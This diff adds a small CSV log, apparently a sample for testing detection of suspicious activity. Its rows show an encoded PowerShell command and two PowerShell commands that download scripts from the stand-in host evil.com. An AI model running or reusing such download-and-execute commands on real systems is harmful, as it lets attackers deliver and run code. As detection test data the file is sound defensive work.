@@ -1,0 +1,4 @@
+timestamp,ip,username,event_type,request
+2026-03-08 14:20:01,192.168.100.10,user1,web_request,powershell.exe -enc SGVsbG8=
+2026-03-08 14:20:20,192.168.100.10,user1,web_request,powershell.exe Invoke-WebRequest http://evil.com/file.ps1
+2026-03-08 14:20:40,192.168.100.10,user1,web_request,DownloadString('http://evil.com/a.ps1')
